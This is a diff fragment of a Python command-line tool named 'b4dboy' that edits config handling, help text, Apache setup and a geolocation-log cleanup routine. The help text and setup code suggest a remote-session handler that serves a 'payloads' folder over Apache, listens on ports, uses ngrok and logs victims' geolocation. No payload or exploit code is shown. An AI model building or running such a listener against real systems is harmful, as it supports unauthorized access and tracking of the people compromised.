-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
-        elif "-d" in arg:
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'"\n}'); confF.close()
+        if "-d" in arg:
             if "--dictionary" in arg: dictionary = arg.split(arg[13])[1]
             else: dictionary = arg.split(arg[2])[1]
-            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
+            with open("config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'"\n}'); confF.close()
     print("[+] Config updated succesfully")
 
 def help_panel():
@@ -247,19 +252,13 @@ def help_panel():
     print("log\n      -m/--mod            Modify data stored from sessions : -m:<id> ip=10.0.0.2\n      -r/--remove         Remove specified session from log : -r=<id>\n      -c/--clean          Delete all data from sessions log\n      -g/--geo            create geolocation log : -g=<id> ip:<public ip>\n      -gm/--geo-mod       Modify geolocation data of a session")
     print("start\n      -s/--session        Use for start a stored session using id : -s:<id>\n      -l/--listen         Use for start listen on a port : -l=2925\n")
     print("show\n      -s/--sessions       Show all sessions stored\n      -g/--geo            Show geographic information about sessions\n      -c/--config         Use for display config\n")
-    print("config\n      -i/--interface      Config network interface\n      -p/--packages       Config the amount of packages received\n      -t/--token          Set or add token of ngrok\n      -d/--dictionary     Modify the parameters for create session id\n      -p/--path           Modify the path of b4dboy")
+    print("config\n      -i/--interface      Config network interface\n      -p/--packages       Config the amount of packages received\n      -t/--token          Set or add token of ngrok\n      -d/--dictionary     Modify the parameters for create session id\n")
 
 
 # Functions
 
 def setup():
-    with open("config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
-    if config["interface"] == "":
-        os.system('mkdir /var/www/html/b4dboy')
-        os.system('mv payloads /var/www/html/b4dboy/')
-        print("[!] Network interface is not configured")
-    os.system('service apache2 start')
-    print("[*] Apache server started on *:80")
+    os.system('service apache2')
 
 def make_id():
     id = ""
@@ -314,28 +313,29 @@ def remove_session(id):
 
 def remove_geo(id):
     with open("logs/geo.json", "r") as sesF:
-        data = sesF.read()
+        sessData = sesF.read()
+        lista = sessData.replace("[","").replace("]","").split(",")
+        sessData = []
+        for arg in lista:
+            sessData.append(json.loads(arg))
+        for session in sessData:
+            if id == session['sess_id']:
+                sessData.remove(session)
     sesF.close()
-    sessData = data.replace("[","").replace("]","").replace("\n","").replace(",{",",{{").split(",{")
-    for sess in sessData:
-        dato2 = json.loads(sess)
-        if dato2["sess_id"] == id: new = dato2; sessData.remove(sess)
-    print(new)
-    print(sessData)
-    with open("logs/geo.json", "w") as geoF:
+    with open("logs/geo.json", "w") as sesF:
         for sess in sessData:
-            session = sess
-            sess = json.loads(sess)
-            if sessData.index(session) == 0: value = '[\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n'
-            elif sessData.index(session) == len(sessData)-1: value = ',{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n]'
-            else: value = ',{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}\n,'
-            geoF.write(value)
+            sesF.write('\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}')
+            if sessData.index(sess) == len(sessData): sesF.write("\n]")
+            else: sesF.write("\n,")
+    sesF.close()
+    os.system('clear')
     banner()
     print("[+] Session removed successfully")
 
-banner()
-setup()
+
 # Interpreter
+setup()
+banner()
 while True:
     with open("config.json", "r") as cFile:
         config = json.loads(cFile.read())
@@ -359,12 +359,12 @@ while True:
             elif action[0] == "config":
                 if len(action) > 1 and action[1] !="" : mod_config()
                 else: print("[-] Parameter Missing. Use h or help for help panel")
-            elif action[0] == "rem":
-                remove_geo("test2")
             elif action[0] == "clear":
                 os.system('clear'); banner()
     except KeyboardInterrupt:
         close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
         if close_vrf != "n" and close_vrf != "N":
+            print("Saliendo ...")
+            os.system("service apache2 stop")
             os.system('clear')
             exit()
